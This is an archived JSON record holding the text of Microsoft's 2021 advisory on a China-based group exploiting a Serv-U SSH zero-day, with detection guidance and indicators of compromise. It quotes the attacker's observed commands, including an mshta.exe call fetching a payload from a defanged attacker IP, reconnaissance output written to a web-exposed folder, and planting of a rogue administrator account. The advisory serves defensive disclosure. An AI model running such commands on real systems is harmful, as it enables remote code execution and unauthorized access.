{
    "id": "76f9ae80-f0f8-48ca-a501-955d65c8ca76",
    "created_at": "2023-01-12T15:09:44.902834Z",
    "updated_at": "2025-03-27T02:11:51.899359Z",
    "deleted_at": null,
    "sha1_hash": "c2ea6bb5aa0ee82da58e9f9c96640aca6fab93b6",
    "title": "2021-07-13 - Microsoft discovers threat actor (DEV-0322) targeting SolarWinds Serv-U software with 0-day exploit",
    "authors": "",
    "file_creation_date": "2022-05-28T16:14:58Z",
    "file_modification_date": "2022-05-28T16:14:58Z",
    "file_size": 1142972,
    "plain_text": "# Microsoft discovers threat actor targeting SolarWinds Serv-U software with 0-day exploit\n\n**microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-**\nday-exploit/\n\nJuly 13, 2021\n\nMicrosoft has detected a 0-day remote code execution exploit being used to attack\nSolarWinds Serv-U FTP software in limited and targeted attacks. The Microsoft Threat\nIntelligence Center (MSTIC) attributes this campaign with high confidence to DEV-0322, a\ngroup operating out of China, based on observed victimology, tactics, and procedures.\n\nThe vulnerability being exploited is CVE-2021-35211, which was recently patched by\nSolarWinds. The vulnerability, which Microsoft reported to SolarWinds, exists in Serv-U’s\nimplementation of the Secure Shell (SSH) protocol. If Serv-U’s SSH is exposed to the\ninternet, successful exploitation would give attackers ability to remotely run arbitrary code\nwith privileges, allowing them to perform actions like install and run malicious payloads, or\nview and change data. We strongly urge all customers to update their instances of Serv-U to\nthe latest available version.\n\n\n-----\n\n[Microsoft 365 Defender has been protecting customers against malicious activity resulting](https://www.microsoft.com/en-us/microsoft-365/security/microsoft-365-defender)\nfrom successful exploitation, even before the security patch was available. Microsoft\nDefender Antivirus blocks malicious files, behavior, and payloads. Our endpoint protection\nsolution detects and raises alerts for the attacker’s follow-on malicious actions. Microsoft\nThreat Experts customers who were affected were notified of attacker activity and were aided\nin responding to the attack.\n\nMicrosoft would like to thank SolarWinds for their cooperation and quick response to the\nvulnerability we reported.\n\n## Who is DEV-0322?\n\nMSTIC tracks and investigates a range of malicious cyber activities and operations. During\nthe tracking and investigation phases prior to when MSTIC reaches high confidence about\nthe origin or identity of the actor behind an operation, we refer to the unidentified threat actor\nas a “development group” or “DEV group” and assigns each DEV group a unique number\n(DEV-####) for tracking purposes.\n\nMSTIC has observed DEV-0322 targeting entities in the U.S. Defense Industrial Base Sector\nand software companies. This activity group is based in China and has been observed using\ncommercial VPN solutions and compromised consumer routers in their attacker\ninfrastructure.\n\n## Attack details\n\nMSTIC discovered the 0-day attack behavior in Microsoft 365 Defender telemetry during a\nroutine investigation. An anomalous malicious process was found to be spawning from the\nServ-U process, suggesting that it had been compromised. Some examples of the malicious\nprocesses spawned from Serv-U.exe include:\n\n_C:\\Windows\\System32\\mshta.exe http://144[.]34[.]179[.]162/a (defanged)_\n_cmd.exe /c whoami > “./Client/Common/redacted.txt”_\n_cmd.exe /c dir > “.\\Client\\Common\\redacted.txt”_\n_cmd.exe /c “”C:\\Windows\\Temp\\Serv-U.bat””_\n_powershell.exe C:\\Windows\\Temp\\Serv-U.bat_\n_cmd.exe /c type \\\\redacted\\redacted.Archive > “C:\\ProgramData\\RhinoSoft\\Serv-_\n_U\\Users\\Global Users\\redacted.Archive”_\n\nWe observed DEV-0322 piping the output of their cmd.exe commands to files in the Serv-U\n_\\Client\\Common\\ folder, which is accessible from the internet by default, so that the attackers_\ncould retrieve the results of the commands. The actor was also found adding a new global\nuser to Serv-U, effectively adding themselves as a Serv-U administrator, by manually\ncreating a crafted .Archive file in the Global Users directory. Serv-U user information is stored\nin these .Archive files.\n\n\n-----\n\nDue to the way DEV-0322 had written their code, when the exploit successfully compromises\nthe Serv-U process, an exception is generated and logged to a Serv-U log file,\n_DebugSocketLog.txt. The process could also crash after a malicious command was run._\n\nBy reviewing telemetry, we identified features of the exploit, but not a root-cause vulnerability.\nMSTIC worked with the Microsoft Offensive Security Research team, who performed\nvulnerability research on the Serv-U binary and identified the vulnerability through black box\nanalysis. Once a root cause was found, we reported the vulnerability to SolarWinds, who\nresponded quickly to understand the issue and build a patch.\n\nTo protect customers before a patch was available, the Microsoft 365 Defender team quickly\nreleased detections that catch known malicious behaviours, ensuring customers are\nprotected from and alerted to malicious activity related to the 0-day. Affected customers\nenrolled to Microsoft Threat Experts, our managed threat hunting service, received a\n[targeted attack notification, which contained details of the compromise. The Microsoft Threat](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-threat-experts?view=o365-worldwide#microsoft-threat-experts---targeted-attack-notification)\nExperts and MSTIC teams worked closely with these customers to respond to the attack and\nensure their environments were secure.\n\n## Detection guidance\n\nCustomers should review the Serv-U DebugSocketLog.txt log file for exception messages\nlike the line below. A C0000005; CSUSSHSocket::ProcessReceive exception can indicate\nthat an exploit was attempted, but it can also appear for unrelated reasons. Either way, if the\nexception is found, customers should carefully review their logs for behaviors and indicators\nof compromise discussed here.\n```\nEXCEPTION: C0000005; CSUSSHSocket::ProcessReceive(); Type: 30; puchPayLoad\n= 0x03e909f6; nPacketLength = 76; nBytesReceived = 80; nBytesUncompressed =\n156; uchPaddingLength = 5\n\n```\nAdditional signs of potential compromise include:\n\nRecent creation of .txt files in the Client\\Common\\ directory for the Serv-U installation.\nThese files may contain output from Windows commands like whoami and dir.\n\n\n-----\n\n_Serv-U.exe spawning child processes that are not part of normal operations. These_\ncould change depending on the customer environment, but we suggest searching for:\n\n_mshta.exe_\n_powershell.exe_\ncmd.exe (or conhost.exe then spawning cmd.exe) with any of the following in the\ncommand line:\n\n_whoami_\n_dir_\n_./Client/Common_\n_.\\Client\\Common_\n_type [a file path] > “C:\\ProgramData\\RhinoSoft\\Serv-U\\Users\\Global Users\\_\n\n_[file name].Archive”_\nAny process with any of the following in the command line:\n\n_C:\\Windows\\Temp\\_\n[The addition of any unrecognized global users to Serv-U. This can be checked in the](https://documentation.solarwinds.com/en/success_center/servu/content/servu-global-users-global-users.htm)\nUsers tab of the Serv-U Management Console, as shown below. It can also be checked\nby looking for recently created files in C:\\ProgramData\\RhinoSoft\\Serv-U\\Users\\Global\n_Users, which appears to store the Global users information._\n\n### Detection details\n\n**Antivirus detections**\n\nMicrosoft Defender Antivirus detects threat components as the following malware:\n\nBehavior:Win32/ServuSpawnSuspProcess.A\nBehavior:Win32/ServuSpawnCmdClientCommon.A\n\n**Endpoint detection and response (EDR) alerts**\n\nAlerts with the following titles in Microsoft Defender for Endpoint can indicate threat activity\non your network:\n\n\n-----\n\nSuspicious behavior by Serv-U.exe\n\n**Azure Sentinel query**\n\nTo locate possible exploitation activity using Azure Sentinel, customers can find a Sentinel\n[query containing these indicators in this GitHub repository.](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/DEV-0322_SolarWinds_Serv-U_IOC.yaml)\n\n### Indicators of compromise (IOCs)\n\n98[.]176[.]196[.]89\n68[.]235[.]178[.]32\n208[.]113[.]35[.]58\n144[.]34[.]179[.]162\n97[.]77[.]97[.]58\nhxxp://144[.]34[.]179[.]162/a\nC:\\Windows\\Temp\\Serv-U.bat\nC:\\Windows\\Temp\\test\\current.dmp\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-13 - Microsoft discovers threat actor (DEV-0322) targeting SolarWinds Serv-U software with 0-day exploit.pdf"
    ],
    "report_names": [
        "2021-07-13 - Microsoft discovers threat actor (DEV-0322) targeting SolarWinds Serv-U software with 0-day exploit.pdf"
    ],
    "threat_actors": [
        {
            "id": "0a80df4d-5ab7-4ca3-809d-8ef7b5a54f1f",
            "created_at": "2023-11-21T02:00:07.386886Z",
            "updated_at": "2025-03-27T02:00:03.248375Z",
            "deleted_at": null,
            "main_name": "TiltedTemple",
            "aliases": [
                "DEV-0322",
                "Circle Typhoon"
            ],
            "source_name": "MISPGALAXY:TiltedTemple",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536184,
    "ts_updated_at": 1743041511,
    "ts_creation_date": 1653754498,
    "ts_modification_date": 1653754498,
    "files": {
        "pdf": "https://archive.orkl.eu/c2ea6bb5aa0ee82da58e9f9c96640aca6fab93b6.pdf",
        "text": "https://archive.orkl.eu/c2ea6bb5aa0ee82da58e9f9c96640aca6fab93b6.txt",
        "img": "https://archive.orkl.eu/c2ea6bb5aa0ee82da58e9f9c96640aca6fab93b6.jpg"
    }
}